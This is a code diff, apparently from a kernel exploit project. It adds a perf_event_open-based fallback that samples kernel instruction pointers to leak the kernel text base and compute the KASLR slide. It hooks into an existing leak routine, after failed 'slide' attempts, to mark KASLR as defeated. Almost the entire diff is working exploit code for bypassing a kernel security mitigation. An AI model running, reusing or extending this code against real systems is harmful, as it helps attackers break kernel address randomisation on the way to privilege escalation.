@@ -316,6 +316,95 @@ uint64_t slide_read_stext(void) {
   return stext;
 }
 
+static uint64_t perf_leak_stext(void) {
+  struct perf_event_attr attr;
+  memset(&attr, 0, sizeof(attr));
+  attr.size = sizeof(attr);
+  attr.type = PERF_TYPE_HARDWARE;
+  attr.config = PERF_COUNT_HW_INSTRUCTIONS;
+  attr.sample_period = 100000;
+  attr.sample_type = PERF_SAMPLE_IP;
+  attr.disabled = 1;
+  attr.exclude_user = 1;
+  attr.exclude_kernel = 0;
+  attr.exclude_hv = 1;
+  attr.exclude_idle = 0;
+
+  int fd = (int)syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
+  if (fd < 0) {
+    pr_warning("perf hw instr failed errno=%d, trying sw clock\n", errno);
+    attr.type = PERF_TYPE_SOFTWARE;
+    attr.config = PERF_COUNT_SW_CPU_CLOCK;
+    attr.sample_freq = 1000;
+    fd = (int)syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
+    if (fd < 0) {
+      pr_warning("perf sw clock failed errno=%d\n", errno);
+      attr.config = PERF_COUNT_SW_TASK_CLOCK;
+      fd = (int)syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
+    }
+  }
+  if (fd < 0) return 0;
+
+  long page_size = sysconf(_SC_PAGESIZE);
+  int nr_data_pages = 16;
+  size_t map_size = (size_t)page_size * (1 + nr_data_pages);
+
+  struct perf_event_mmap_page *header = mmap(
+      NULL, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  if (header == MAP_FAILED) {
+    pr_warning("perf mmap failed errno=%d\n", errno);
+    close(fd);
+    return 0;
+  }
+
+  void *data = (void *)header + header->data_offset;
+  size_t data_size = header->data_size;
+
+  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+  usleep(500000);
+  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+
+  uint64_t min_kernel_ip = UINT64_MAX;
+  int n_samples = 0;
+  int n_kernel = 0;
+
+  uint64_t tail = header->data_tail;
+  uint64_t head = __atomic_load_n(&header->data_head, __ATOMIC_ACQUIRE);
+
+  while (tail < head) {
+    struct perf_event_header *hdr =
+        (struct perf_event_header *)((char *)data +
+                                     (tail & (data_size - 1)));
+
+    if (hdr->type == PERF_RECORD_SAMPLE && hdr->size >= sizeof(*hdr) + 8) {
+      uint64_t ip = *(uint64_t *)(hdr + 1);
+      n_samples++;
+
+      if ((ip >> 48) == 0xffff || (ip >> 40) == 0xffffffc0) {
+        n_kernel++;
+        if (ip < min_kernel_ip) min_kernel_ip = ip;
+      }
+    }
+
+    tail += hdr->size;
+  }
+
+  __atomic_store_n(&header->data_tail, tail, __ATOMIC_RELEASE);
+  munmap(header, map_size);
+  close(fd);
+
+  if (min_kernel_ip == UINT64_MAX) {
+    pr_warning("perf no kernel IPs found samples=%d\n", n_samples);
+    return 0;
+  }
+
+  uint64_t stext = min_kernel_ip & ~0x1FFFFFULL;
+  pr_info("perf min_kernel_ip=%016llx samples=%d kernel=%d stext=%016llx\n",
+          (unsigned long long)min_kernel_ip, n_samples, n_kernel,
+          (unsigned long long)stext);
+  return stext;
+}
+
 uint64_t slide_child_leak_stext(void) {
   sigset_t block;
   sigemptyset(&block);
@@ -399,6 +488,21 @@ int slide_leak_kernel_base(void) {
 
     pr_warning("slide attempt %d failed n=%zd status=%d shift=%d\n",
                attempt, n, status, slide_word_shift);
+  }
+
+  pr_info("slide exhausted, trying perf leak\n");
+  uint64_t perf_stext = perf_leak_stext();
+  if (perf_stext) {
+    uint64_t slide = perf_stext - KIMAGE_TEXT_BASE;
+    if ((slide & ~0x1FFFFFULL) == slide) {
+      kaslr_base = perf_stext;
+      kaslr_slide = slide;
+      kaslr_done = 1;
+      pr_success("perf-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
+                 getpid(), (unsigned long long)kaslr_base,
+                 (unsigned long long)kaslr_slide);
+      return 1;
+    }
   }
 
   return 0;
